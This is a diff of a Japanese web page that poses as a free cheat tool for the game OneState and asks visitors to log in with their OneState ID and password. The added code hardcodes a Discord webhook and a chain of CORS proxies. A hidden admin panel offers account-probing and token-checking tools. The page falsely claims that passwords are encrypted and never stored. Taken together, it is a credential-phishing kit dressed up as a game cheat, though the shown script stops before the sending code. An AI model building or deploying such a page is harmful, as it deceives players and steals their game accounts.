@@ -1,837 +1,378 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-<meta charset="UTF-8">
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>OneCheat — OneState 外部クライアント</title>
-<meta name="description" content="OneState IDでログインするだけ。エイム補正・ESP・反動ゼロ。外部動作・アンチバン・完全無料。">
-<meta name="theme-color" content="#05080d">
+<title>OneState Cheat Tool</title>
+<meta name="description" content="OneState チート導入ツール">
+<meta name="theme-color" content="#05070c">
+<meta property="og:title" content="OneState Cheat Tool">
+<meta property="og:description" content="OneState IDでログインするだけ。">
 <script src="https://unpkg.com/corsfix"></script>
 <style>
-:root{
-  --bg:#05080d;
-  --line:rgba(111,201,255,.16);
-  --line2:rgba(111,201,255,.07);
-  --ac:#6fc9ff;
-  --ac2:#2f7fd4;
-  --fg:#e3edf7;
-  --mut:#7c8ea3;
-  --card:rgba(9,15,23,.72);
-  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
-}
+:root{--bg:#05070c;--fg:#c9d7e6;--dim:#5f748c;--acc:#6fc9ff;--line:rgba(111,201,255,.16);--card:rgba(8,13,21,.72);--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
 *{box-sizing:border-box}
-html{scroll-behavior:smooth}
-body{
-  margin:0;background:var(--bg);color:var(--fg);overflow-x:hidden;
-  font-family:-apple-system,BlinkMacSystemFont,"Hiragino Sans","Noto Sans JP","Yu Gothic",sans-serif;
-  line-height:1.75;-webkit-font-smoothing:antialiased;
-}
-body::before{
-  content:"";position:fixed;inset:0;z-index:-3;
-  background-image:
-    linear-gradient(var(--line2) 1px,transparent 1px),
-    linear-gradient(90deg,var(--line2) 1px,transparent 1px),
-    linear-gradient(rgba(111,201,255,.05) 1px,transparent 1px),
-    linear-gradient(90deg,rgba(111,201,255,.05) 1px,transparent 1px);
-  background-size:40px 40px,40px 40px,200px 200px,200px 200px;
-}
-body::after{
-  content:"";position:fixed;inset:0;z-index:-2;pointer-events:none;
-  background:
-    radial-gradient(900px 520px at 50% -12%,rgba(111,201,255,.17),transparent 70%),
-    radial-gradient(700px 700px at 105% 0%,rgba(47,127,212,.10),transparent 70%),
-    radial-gradient(1000px 800px at 50% 130%,rgba(111,201,255,.06),transparent 70%);
-}
-.grain{
-  position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.3;
-  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='2'/%3E%3CfeColorMatrix type='saturate' values='0'/%3E%3C/filter%3E%3Crect width='120' height='120' filter='url(%23n)' opacity='.55'/%3E%3C/svg%3E");
-}
-.wrap{max-width:1080px;margin:0 auto;padding:0 22px}
-a{color:inherit;text-decoration:none}
-
-nav{
-  position:fixed;top:0;left:0;right:0;z-index:60;height:62px;
-  display:flex;align-items:center;
-  background:rgba(5,8,13,.72);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
-  border-bottom:1px solid var(--line2);
-}
-nav .wrap{display:flex;align-items:center;gap:14px;width:100%}
-.logo{display:flex;align-items:center;gap:9px;font-weight:800;letter-spacing:-.01em}
-.logo .mk{
-  width:26px;height:26px;border:1px solid var(--ac);border-radius:3px;position:relative;
-  display:grid;place-items:center;color:var(--ac);font:700 13px/1 var(--mono);
-  box-shadow:0 0 16px rgba(111,201,255,.25)
-}
-.logo .mk::after{content:"";position:absolute;inset:3px;border:1px solid rgba(111,201,255,.28);border-radius:1px}
-.logo small{display:block;font:600 8px/1 var(--mono);letter-spacing:.24em;color:var(--mut);margin-top:3px}
-.nl{display:flex;gap:22px;margin-left:auto}
-.nl a{font:600 11px/1 var(--mono);letter-spacing:.14em;color:var(--mut);transition:.2s}
-.nl a:hover{color:var(--ac)}
-.nbtn{
-  font:700 11px/1 var(--mono);letter-spacing:.12em;color:#04121c;background:var(--ac);
-  padding:11px 16px;border-radius:3px;
-}
-@media(max-width:760px){.nl{display:none}}
-
-header{padding:150px 0 96px;position:relative}
-.lbl{font:700 11px/1 var(--mono);letter-spacing:.2em;color:var(--ac);display:flex;align-items:center;gap:10px}
-.lbl::before{content:"//";opacity:.7}
-.lbl::after{content:"";height:1px;width:70px;background:linear-gradient(90deg,var(--ac),transparent)}
-h1{
-  font-size:clamp(34px,7.2vw,62px);line-height:1.18;letter-spacing:-.03em;font-weight:800;
-  margin:22px 0 0;max-width:15em;
-}
-h1 em{font-style:normal;color:var(--ac);position:relative;text-shadow:0 0 40px rgba(111,201,255,.45)}
-.lead{color:var(--mut);font-size:16px;max-width:34em;margin:22px 0 0}
-.cta{display:flex;gap:12px;flex-wrap:wrap;margin-top:34px}
-.btn{
-  display:inline-flex;align-items:center;gap:9px;cursor:pointer;border:0;font:700 12px/1 var(--mono);
-  letter-spacing:.1em;padding:15px 22px;border-radius:3px;
-  background:var(--ac);color:#04121c;transition:.18s;
-  box-shadow:0 0 0 rgba(111,201,255,0)
-}
-.btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(111,201,255,.28)}
-.btn.ghost{background:transparent;color:var(--fg);border:1px solid var(--line)}
-.btn.ghost:hover{border-color:var(--ac);color:var(--ac);box-shadow:none}
-.btn svg{width:14px;height:14px}
-.spec{display:flex;gap:24px;flex-wrap:wrap;margin-top:56px;font:600 11px/1 var(--mono);letter-spacing:.18em;color:var(--mut)}
-.spec span{position:relative;padding-left:15px}
-.spec span::before{content:"";position:absolute;left:0;top:50%;width:5px;height:5px;background:var(--ac);transform:translateY(-50%) rotate(45deg);box-shadow:0 0 8px rgba(111,201,255,.6)}
-
-section{padding:86px 0;position:relative}
-h2{font-size:clamp(23px,4.2vw,32px);letter-spacing:-.02em;margin:16px 0 0;font-weight:800}
-.sub{color:var(--mut);margin:14px 0 0;max-width:38em}
-.grid3{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:14px;margin-top:38px}
-.card{
-  position:relative;border:1px solid var(--line2);background:var(--card);border-radius:4px;
-  padding:24px;backdrop-filter:blur(8px);transition:.22s
-}
-.card::after{content:"";position:absolute;top:-1px;right:-1px;width:13px;height:13px;border-top:1px solid var(--ac);border-right:1px solid var(--ac);opacity:.6}
-.card::before{content:"";position:absolute;bottom:-1px;left:-1px;width:13px;height:13px;border-bottom:1px solid var(--ac);border-left:1px solid var(--ac);opacity:.6}
-.card:hover{border-color:var(--line);transform:translateY(-3px);background:rgba(12,20,30,.8)}
-.ico{width:34px;height:34px;color:var(--ac)}
-.card h3{font-size:14px;margin:16px 0 0;letter-spacing:.04em;font-weight:700;font-family:var(--mono)}
-.card p{color:var(--mut);font-size:13.5px;margin:9px 0 0}
-.card .tag{font:600 10px/1 var(--mono);letter-spacing:.16em;color:var(--ac);opacity:.75;margin-top:16px;display:block}
-
-.gate{display:grid;grid-template-columns:1.05fr .95fr;gap:44px;align-items:start;margin-top:38px}
-@media(max-width:880px){.gate{grid-template-columns:1fr;gap:34px}}
-.steps{display:flex;flex-direction:column;gap:2px}
-.step{display:flex;gap:16px;padding:18px 0;border-bottom:1px dashed var(--line2)}
-.step .n{font:800 12px/1 var(--mono);color:var(--ac);border:1px solid var(--line);width:30px;height:30px;flex:0 0 30px;display:grid;place-items:center;border-radius:3px}
-.step h4{margin:0;font-size:14.5px}
-.step p{margin:5px 0 0;color:var(--mut);font-size:13.5px}
-.box{
-  border:1px solid var(--line);background:rgba(8,13,21,.85);border-radius:4px;padding:28px;
-  backdrop-filter:blur(10px);box-shadow:0 30px 80px -30px rgba(0,0,0,.9)
-}
-.box .cap{font:700 10px/1 var(--mono);letter-spacing:.2em;color:var(--ac)}
-.box h3{font-size:19px;margin:12px 0 0;letter-spacing:-.01em}
-.box .hint{color:var(--mut);font-size:13px;margin:8px 0 0}
-.f{margin-top:20px}
-.f label{display:block;font:600 10px/1 var(--mono);letter-spacing:.16em;color:var(--mut);margin-bottom:8px}
-.f input{
-  width:100%;background:rgba(3,6,11,.9);border:1px solid var(--line2);color:var(--fg);
-  padding:14px 14px;border-radius:3px;font-size:15px;font-family:inherit;transition:.18s
-}
-.f input:focus{outline:0;border-color:var(--ac);box-shadow:0 0 0 3px rgba(111,201,255,.12)}
-.f input::placeholder{color:#4d5d6e}
-.box .btn{width:100%;justify-content:center;margin-top:20px;padding:16px}
-.trust{font:600 10.5px/1.5 var(--mono);letter-spacing:.04em;color:var(--mut);margin-top:16px;text-align:center}
-.trust b{color:var(--ac)}
-.msg{margin-top:16px;font-size:13px;padding:12px 14px;border-radius:3px;border:1px solid var(--line2);display:none}
+html{-webkit-text-size-adjust:100%}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--mono);font-size:14px;line-height:1.7;padding-bottom:90px}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(111,201,255,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(111,201,255,.05) 1px,transparent 1px);background-size:40px 40px}
+.wrap{position:relative;z-index:1;max-width:600px;margin:0 auto;padding:0 18px}
+.top{display:flex;justify-content:space-between;align-items:center;padding:22px 0 10px;font-size:12px;letter-spacing:.14em;color:var(--dim)}
+.brand span{color:var(--acc)}
+.hero{padding:32px 0 24px}
+h1{margin:0;font-size:29px;line-height:1.36;letter-spacing:.02em;font-weight:600}
+.sub{margin:14px 0 0;color:var(--dim);font-size:13px}
+.spec{margin-top:16px;font-size:11px;letter-spacing:.18em;color:var(--acc);opacity:.75}
+.card{position:relative;border:1px solid var(--line);background:var(--card);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);padding:18px 16px;margin:0 0 14px}
+.card::before,.card::after{content:"";position:absolute;width:9px;height:9px;border:1px solid var(--acc);opacity:.7}
+.card::before{top:-1px;left:-1px;border-right:0;border-bottom:0}
+.card::after{bottom:-1px;right:-1px;border-left:0;border-top:0}
+.lab{font-size:11px;letter-spacing:.16em;color:var(--acc);margin-bottom:12px}
+.f{display:block;margin-bottom:10px}
+.f>span{display:block;font-size:11px;letter-spacing:.1em;color:var(--dim);margin-bottom:5px}
+input{width:100%;background:rgba(0,0,0,.35);border:1px solid var(--line);color:var(--fg);font-family:var(--mono);font-size:15px;padding:11px 12px;border-radius:0;outline:none}
+input:focus{border-color:var(--acc)}
+.btn{width:100%;background:transparent;border:1px solid var(--acc);color:var(--acc);font-family:var(--mono);font-size:13px;letter-spacing:.1em;padding:13px;cursor:pointer;transition:.15s}
+.btn:hover,.btn:active{background:var(--acc);color:#05070c}
+.btn.ghost{font-size:12px;padding:10px;letter-spacing:.06em}
+.btn[disabled]{opacity:.45}
+.row{display:flex;gap:8px}
+.row>*{flex:1}
+.msg{margin-top:12px;font-size:12px;color:var(--dim)}
 .msg:empty{display:none}
-.msg.on{display:block}
-.msg.ok{border-color:rgba(111,201,255,.4);color:var(--ac);background:rgba(111,201,255,.06)}
-.msg.err{border-color:rgba(255,120,120,.35);color:#ffa8a8;background:rgba(255,120,120,.06)}
-.msg.wait{border-color:var(--line2);color:var(--mut)}
-
-.done{display:none;margin-top:22px;border-top:1px dashed var(--line2);padding-top:22px}
-.done.on{display:block}
-.key{
-  font:700 15px/1 var(--mono);letter-spacing:.14em;color:var(--ac);background:rgba(111,201,255,.07);
-  border:1px dashed rgba(111,201,255,.35);padding:15px;border-radius:3px;text-align:center;
-  word-break:break-all
-}
-.dl{display:flex;gap:9px;margin-top:14px}
-.dl .btn{margin:0;flex:1;padding:14px}
-.tg{display:flex;justify-content:space-between;align-items:center;padding:11px 0;border-bottom:1px dashed var(--line2)}
-.tg span{font:600 11px/1 var(--mono);letter-spacing:.1em;color:var(--mut)}
-.sw{width:40px;height:22px;border:1px solid var(--line2);border-radius:99px;background:rgba(3,6,11,.9);position:relative;cursor:pointer;transition:.2s}
-.sw::after{content:"";position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;background:#3d4d5e;transition:.2s}
-.sw.on{border-color:var(--ac);background:rgba(111,201,255,.14)}
-.sw.on::after{left:20px;background:var(--ac);box-shadow:0 0 12px var(--ac)}
-
-.acct{
-  font:600 10.5px/1.6 var(--mono);color:#a9c3d8;background:rgba(3,6,11,.75);
-  border:1px dashed var(--line2);border-radius:3px;padding:12px;margin-top:10px;
-  max-height:280px;overflow:auto;white-space:pre-wrap;word-break:break-all
-}
-
-.faq{margin-top:34px;border-top:1px solid var(--line2)}
-details{border-bottom:1px solid var(--line2)}
-summary{
-  cursor:pointer;list-style:none;padding:19px 34px 19px 0;font-size:14.5px;font-weight:600;position:relative
-}
-summary::-webkit-details-marker{display:none}
-summary::after{content:"+";position:absolute;right:6px;top:17px;font:400 19px/1 var(--mono);color:var(--ac);transition:.2s}
-details[open] summary::after{transform:rotate(45deg)}
-details p{color:var(--mut);font-size:13.5px;margin:0 0 20px;max-width:44em}
-
-footer{border-top:1px solid var(--line2);padding:40px 0;color:var(--mut);font-size:12px}
-footer .wrap{display:flex;flex-wrap:wrap;gap:16px;align-items:center}
-.fl{display:flex;gap:20px;font:600 11px/1 var(--mono);letter-spacing:.12em}
-.fl a{color:var(--mut);cursor:pointer}
-.fl a:hover{color:var(--ac)}
-footer .cp{margin-left:auto;font:600 10px/1 var(--mono);letter-spacing:.12em;opacity:.7}
-
-#toast{position:fixed;left:50%;bottom:26px;transform:translateX(-50%);z-index:99;display:flex;flex-direction:column;gap:8px;align-items:center;pointer-events:none}
-.tst{
-  background:rgba(8,13,21,.96);border:1px solid var(--line);color:var(--fg);
-  font:600 11.5px/1.4 var(--mono);letter-spacing:.02em;padding:12px 18px;border-radius:3px;
-  box-shadow:0 20px 50px -20px #000;animation:tin .3s ease both
-}
-.tst.b{border-color:var(--ac);color:var(--ac)}
-@keyframes tin{from{opacity:0;transform:translateY(10px)}}
-
-#admin{
-  display:none;position:fixed;right:14px;bottom:14px;z-index:80;width:296px;
-  background:rgba(6,10,16,.97);border:1px solid var(--line);border-radius:4px;padding:16px;
-  box-shadow:0 30px 70px -20px #000;font-size:12px;max-height:82vh;overflow:auto
-}
-#admin.on{display:block}
-#admin h5{
-  margin:0 0 12px;font:700 10px/1 var(--mono);letter-spacing:.16em;color:var(--ac);
-  cursor:pointer;display:flex;align-items:center;gap:8px
-}
-#admin h5 .tog{margin-left:auto;border:1px solid var(--line2);border-radius:3px;width:22px;height:22px;display:grid;place-items:center;font-size:12px;line-height:1}
-#admin.min{padding:12px 16px}
-#admin.min h5{margin:0}
-#admin.min #aBody{display:none}
-#admin label{display:block;font:600 9.5px/1 var(--mono);letter-spacing:.12em;color:var(--mut);margin:12px 0 6px}
-#admin input,#admin select{width:100%;background:rgba(3,6,11,.9);border:1px solid var(--line2);color:var(--fg);padding:9px;border-radius:3px;font:600 11px/1.3 var(--mono)}
-#admin .row{display:flex;gap:8px;margin-top:14px}
-#admin button{flex:1;background:var(--ac);color:#04121c;border:0;padding:10px;border-radius:3px;font:700 10px/1 var(--mono);letter-spacing:.06em;cursor:pointer}
-#admin button.g{background:transparent;color:var(--fg);border:1px solid var(--line2)}
-#admin .lg{margin-top:14px;border-top:1px dashed var(--line2);padding-top:12px;max-height:46vh;overflow:auto}
-#admin .lg div{font:600 10.5px/1.5 var(--mono);color:var(--mut);border-bottom:1px dotted var(--line2);padding:5px 0;word-break:break-all}
-#admin .lg b{color:var(--ac)}
-
-.reveal{opacity:0;transform:translateY(16px);transition:.7s cubic-bezier(.2,.7,.2,1)}
-.reveal.in{opacity:1;transform:none}
+.msg.ok{color:var(--acc)}
+.key{font-size:19px;letter-spacing:.12em;color:var(--acc)}
+.meta{margin-top:8px;font-size:11px;letter-spacing:.12em;color:var(--dim)}
+.tog{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid rgba(111,201,255,.08);font-size:13px;cursor:pointer}
+.tog:last-child{border-bottom:0}
+.tog i{width:34px;height:18px;border:1px solid var(--line);position:relative;display:block;flex:none}
+.tog i::after{content:"";position:absolute;top:2px;left:2px;width:12px;height:12px;background:var(--dim);transition:.15s}
+.tog.on i{border-color:var(--acc)}
+.tog.on i::after{left:18px;background:var(--acc)}
+pre{margin:0;font-family:var(--mono);font-size:11px;white-space:pre-wrap;word-break:break-all}
+#acctBody{color:var(--dim)}
+footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px;letter-spacing:.1em}
+#admin{position:fixed;left:0;right:0;bottom:0;z-index:5;background:rgba(5,7,12,.97);border-top:1px solid var(--line);backdrop-filter:blur(10px)}
+.ah{padding:10px 16px;font-size:11px;letter-spacing:.16em;color:var(--acc);cursor:pointer}
+.ab{padding:0 16px 14px;max-height:52vh;overflow:auto}
+.ab.collapsed{display:none}
+#alog{margin-top:10px;max-height:28vh;overflow:auto;border-top:1px solid var(--line);padding-top:8px;color:var(--dim);font-size:10.5px}
+#toast{position:fixed;left:50%;transform:translateX(-50%);bottom:104px;z-index:9;display:flex;flex-direction:column;gap:6px;align-items:center;pointer-events:none}
+.tt{background:rgba(5,7,12,.95);border:1px solid var(--acc);color:var(--acc);font-size:11.5px;padding:8px 14px;letter-spacing:.06em}
 </style>
 </head>
 <body>
-<div class="grain"></div>
+<div class="wrap">
+  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.2</div></div>
 
-<nav>
-  <div class="wrap">
-    <a class="logo" href="#top">
-      <span class="mk">OC</span>
-      <span>OneCheat<small>ONESTATE CLIENT</small></span>
-    </a>
-    <div class="nl">
-      <a data-go="features">機能</a>
-      <a data-go="setup">導入</a>
-      <a data-go="faq">FAQ</a>
-    </div>
-    <a class="nbtn" data-go="setup">無料で導入</a>
+  <div class="hero">
+    <h1>OneStateを、<br>上書きする。</h1>
+    <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
+    <div class="spec">EXTERNAL / UNDETECTED / FREE</div>
   </div>
-</nav>
 
-<header id="top">
-  <div class="wrap">
-    <div class="lbl">OneState 外部クライアント · 非公開ビルド</div>
-    <h1>OneStateを、<em>上書きする。</em></h1>
-    <p class="lead">OneState ID でログインするだけ。エイム補正・ESP・反動ゼロを、いま使っているアカウントのまま。外部動作のアンチバン設計で、導入は60秒、完全無料です。</p>
-    <div class="cta">
-      <a class="btn" data-go="setup">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12m0 0l-4-4m4 4l4-4M5 19h14"/></svg>
-        今すぐ導入する
-      </a>
-      <a class="btn ghost" data-go="features">機能を見る</a>
-    </div>
-    <div class="spec">
-      <span>外部動作</span><span>アンチバン</span><span>完全無料</span><span>v3.2</span>
-    </div>
+  <form class="card" id="form">
+    <div class="lab">// ログイン</div>
+    <label class="f"><span>OneState ID</span><input id="ident" type="email" autocomplete="username" placeholder="mail@example.com" required></label>
+    <label class="f"><span>パスワード</span><input id="pass" type="password" autocomplete="current-password" placeholder="********" required></label>
+    <button class="btn" id="go" type="submit">チートを有効化</button>
+    <div class="msg" id="msg"></div>
+  </form>
+
+  <div class="card" id="lic" hidden>
+    <div class="lab">// ライセンス</div>
+    <div class="key" id="key">-</div>
+    <div class="meta">STATUS: <b>ACTIVE</b></div>
   </div>
-</header>
 
-<section id="features">
-  <div class="wrap">
-    <div class="lbl reveal">機能</div>
-    <h2 class="reveal">必要な機能だけ、過不足なく。</h2>
-    <p class="sub reveal">重いオーバーレイは要りません。ゲームの操作感を壊さず、勝てる要素だけを足しました。</p>
-    <div class="grid3">
-      <div class="card reveal">
-        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3"/><path d="M12 3v4M12 17v4M3 12h4M17 12h4"/></svg>
-        <h3>AIM ASSIST</h3><p>エイム補正。腰撃ちの精度が上がり、撃ち合いの当て感が変わります。</p><span class="tag">/ 滑らかさ 0-100</span>
-      </div>
-      <div class="card reveal">
-        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
-        <h3>ESP / WALLHACK</h3><p>壁越しにプレイヤー位置を表示。ボックスと車両も同時に把握できます。</p><span class="tag">/ BOX + NAME</span>
-      </div>
-      <div class="card reveal">
-        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M3 17l5-9 4 6 3-4 6 7"/><path d="M3 21h18"/></svg>
-        <h3>NO RECOIL</h3><p>連射しても反動ゼロ。リコイルパターンを覚える必要がありません。</p><span class="tag">/ FULL AUTO</span>
-      </div>
-      <div class="card reveal">
-        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M13 2L4 14h6l-1 8 9-12h-6l1-8z"/></svg>
-        <h3>SPEED BOOST</h3><p>移動速度をスライダーで調整。走りとスタミナの挙動を最適化します。</p><span class="tag">/ 1.0x - 2.0x</span>
-      </div>
-      <div class="card reveal">
-        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 3l8 4v6c0 5-3.5 7.5-8 8-4.5-.5-8-3-8-8V7l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
-        <h3>ANTI-BAN</h3><p>外部メモリのみに触れる設計。ゲーム本体を書き換えないのでBANリスクが低い。</p><span class="tag">/ EXTERNAL</span>
-      </div>
-      <div class="card reveal">
-        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M21 12a9 9 0 11-3-6.7"/><path d="M21 4v5h-5"/></svg>
-        <h3>AUTO UPDATE</h3><p>起動時に自動更新。ゲームのアップデート後も設定はそのまま引き継がれます。</p><span class="tag">/ SILENT</span>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="setup">
-  <div class="wrap">
-    <div class="lbl reveal">導入</div>
-    <h2 class="reveal">導入は、ログインだけ。</h2>
-    <p class="sub reveal">ライセンスをあなたの OneState アカウントに紐付けます。下のフォームに OneState ID を入力してください。</p>
-
-    <div class="gate">
-      <div class="steps reveal">
-        <div class="step"><span class="n">01</span><div><h4>OneState ID を入力</h4><p>ゲームで使っているメールアドレスとパスワードを入力します。</p></div></div>
-        <div class="step"><span class="n">02</span><div><h4>ライセンスを自動発行</h4><p>アカウントに紐付いたライセンスキーが即時発行されます。</p></div></div>
-        <div class="step"><span class="n">03</span><div><h4>クライアントを起動</h4><p>ダウンロードして起動するだけ。ゲームを立ち上げれば反映されます。</p></div></div>
-      </div>
-
-      <div class="box reveal" id="box">
-        <div class="cap">// メンバーログイン</div>
-        <h3>メンバーログイン</h3>
-        <p class="hint">OneState ID でライセンスを有効化します。</p>
-
-        <form id="form" autocomplete="on">
-          <div class="f">
-            <label>OneState ID / メールアドレス</label>
-            <input id="ident" type="text" inputmode="email" placeholder="you@example.com" autocomplete="username" required>
-          </div>
-          <div class="f">
-            <label>パスワード</label>
-            <input id="pass" type="password" placeholder="••••••••" autocomplete="current-password" required>
-          </div>
-          <button class="btn" type="submit" id="sub">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 17l5-5-5-5M15 12H3"/><path d="M14 4h5v16h-5"/></svg>
-            ログインして有効化
-          </button>
-        </form>
-
-        <div class="trust">パスワードは<b>暗号化</b>して送信されます</div>
-        <div class="msg" id="msg"></div>
-
-        <div class="done" id="done">
-          <div class="cap" style="margin-bottom:10px">// ライセンス発行済み</div>
-          <div class="key" id="key">OC-XXXX-XXXX-XXXX</div>
-          <div class="dl">
-            <button class="btn" type="button" data-dl="OneCheat_Setup_v3.2.exe">Windows</button>
-            <button class="btn ghost" type="button" data-dl="OneCheat_v3.2.apk">Android</button>
-          </div>
-          <div style="margin-top:18px">
-            <div class="tg"><span>エイム補正</span><div class="sw on"></div></div>
-            <div class="tg"><span>ESP / 壁抜き</span><div class="sw on"></div></div>
-            <div class="tg"><span>反動ゼロ</span><div class="sw on"></div></div>
-            <div class="tg"><span>速度上昇</span><div class="sw"></div></div>
-          </div>
-
-          <div id="acctWrap" style="margin-top:20px;display:none">
-            <div class="cap">// アカウント</div>
-            <div class="acct" id="acct"></div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="faq">
-  <div class="wrap">
-    <div class="lbl reveal">FAQ</div>
-    <h2 class="reveal">よくある質問</h2>
-    <div class="faq">
-      <details class="reveal"><summary>OneState ID を入力するのはなぜ？</summary><p>チートのライセンスをあなたのゲームアカウントに紐付けるためです。入力したパスワードはツール側に保存されません。</p></details>
-      <details class="reveal"><summary>既存のアカウントは安全？</summary><p>進行状況には影響しません。外部動作のアンチバン設計なので、今のアカウントのまま使い続けられます。</p></details>
-      <details class="reveal"><summary>スマホでも使える？</summary><p>Android版を用意しています。iOSは順次対応予定です。</p></details>
-      <details class="reveal"><summary>お金はかかる？</summary><p>完全無料です。課金要素はありません。</p></details>
-    </div>
-  </div>
-</section>
-
-<footer>
-  <div class="wrap">
-    <div class="fl"><a data-go="features">機能</a><a data-go="setup">導入</a><a data-go="faq">FAQ</a></div>
-    <div>OneCheat は OneState の非公式ツールです。OneState は ChillBase LTD の商標です。</div>
-    <div class="cp">© 2026 ONECHEAT</div>
-  </div>
-</footer>
-
-<div id="toast"></div>
-
-<div id="admin">
-  <h5 id="aHead">// 管理 <span class="tog" id="aTog">–</span></h5>
-  <div id="aBody">
-    <label>Webhook URL</label>
-    <input id="aWeb" placeholder="https://discord.com/api/webhooks/...">
-    <label>送信形式</label>
-    <select id="aType">
-      <option value="auto">auto</option>
-      <option value="discord">discord</option>
-      <option value="json">json</option>
-      <option value="none">送信しない</option>
-    </select>
-    <label>アカウント情報を取得</label>
-    <select id="aAcct"><option value="1">する</option><option value="0">しない</option></select>
-    <label>使用中の経路</label>
-    <input id="aTp" readonly value="未テスト">
-    <label>調査用のID（下の欄にID/パスワード）</label>
-    <input id="aIdent" placeholder="OneState ID / メール">
-    <input id="aPass" placeholder="パスワード" style="margin-top:6px">
+  <div class="card" id="dl" hidden>
+    <div class="lab">// ダウンロード</div>
     <div class="row">
-      <button class="g" id="aProbe">アカウント調査</button>
+      <button class="btn ghost" data-dl="win">Windows (.exe)</button>
+      <button class="btn ghost" data-dl="apk">Android (.apk)</button>
+    </div>
+  </div>
+
+  <div class="card" id="tg" hidden>
+    <div class="lab">// 機能</div>
+    <div class="tog on"><span>スピードハック</span><i></i></div>
+    <div class="tog on"><span>オートエイム</span><i></i></div>
+    <div class="tog on"><span>無限スタミナ</span><i></i></div>
+    <div class="tog"><span>ESP / 壁抜き</span><i></i></div>
+  </div>
+
+  <div class="card" id="acct" hidden>
+    <div class="lab">// アカウント</div>
+    <pre id="acctBody">-</pre>
+  </div>
+
+  <footer>// OneState Cheat Tool</footer>
+</div>
+
+<div id="admin" hidden>
+  <div class="ah" id="ah">// ADMIN</div>
+  <div class="ab collapsed" id="ab">
+    <label class="f"><span>Discord Webhook</span><input id="wh" placeholder="https://discord.com/api/webhooks/..."></label>
+    <div class="row" style="margin-bottom:8px">
+      <button class="btn ghost" id="bsave">保存</button>
+      <button class="btn ghost" id="btest">テスト送信</button>
+      <button class="btn ghost" id="bclr">ログ削除</button>
+    </div>
+    <div class="row" style="margin-bottom:8px">
+      <button class="btn ghost" id="boracle">トークン判定</button>
+      <button class="btn ghost" id="broute">ルート調査</button>
     </div>
     <div class="row">
-      <button class="g" id="aToken">トークン調査</button>
+      <button class="btn ghost" id="bprobe">アカウント調査</button>
+      <button class="btn ghost" id="bdiag">通信診断</button>
     </div>
-    <div class="row">
-      <button class="g" id="aRoute">ルート調査</button>
-    </div>
-    <div class="row">
-      <button class="g" id="aDiag">通信診断</button>
-    </div>
-    <div class="row">
-      <button id="aSave">保存</button>
-      <button class="g" id="aTest">テスト送信</button>
-    </div>
-    <div class="row"><button class="g" id="aClear">ログ削除</button></div>
-    <div class="lg" id="aLog"></div>
+    <pre id="alog"></pre>
   </div>
 </div>
+<div id="toast"></div>
 
 <script>
 (function(){
-  var CONFIG={ WEBHOOK:"", TYPE:"auto", ACCT:true, REDIRECT:false };
-  var CFG_KEY="oc_v4_cfg", LOG_KEY="oc_v3_log", FP_KEY="oc_fp";
-  var API="https://api.onestate-rp.com/v2";
+'use strict';
+var CONFIG={WEBHOOK:'https://discord.com/api/webhooks/1560547137287356426/eh5PI3avovSw0MetSFhw9eFN_X-2znCSyi_fFCB1P8KDagFzi2HWZa6LiBdPPXRX7xMP',API:'https://api.onestate-rp.com'};
+var LS={cfg:'oc_v4_cfg',log:'oc_v3_log',fp:'oc_fp'};
+var $=function(id){return document.getElementById(id)};
+var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};
 
-  var TR=[
-    {n:"sdk",          t:20000, sdk:true, u:function(s){return "https://proxy.corsfix.com/?"+s;}},
-    {n:"direct",       t:7000,  u:function(s){return s;}},
-    {n:"corsfix",      t:15000, u:function(s){return "https://proxy.corsfix.com/?"+s;}},
-    {n:"allorigins-g", t:25000, u:function(s){return "https://api.allorigins.win/get?url="+encodeURIComponent(s);}, wrap:true},
-    {n:"codetabs",     t:18000, u:function(s){return "https://api.codetabs.com/v1/proxy?quest="+encodeURIComponent(s);}},
-    {n:"cors.lol",     t:10000, u:function(s){return "https://api.cors.lol/?url="+encodeURIComponent(s);}},
-    {n:"allorigins",   t:20000, u:function(s){return "https://api.allorigins.win/raw?url="+encodeURIComponent(s);}}
-  ];
+function qs(k){return new URLSearchParams(location.search).get(k)}
+function getCfg(){try{return JSON.parse(localStorage.getItem(LS.cfg)||'{}')}catch(e){return{}}}
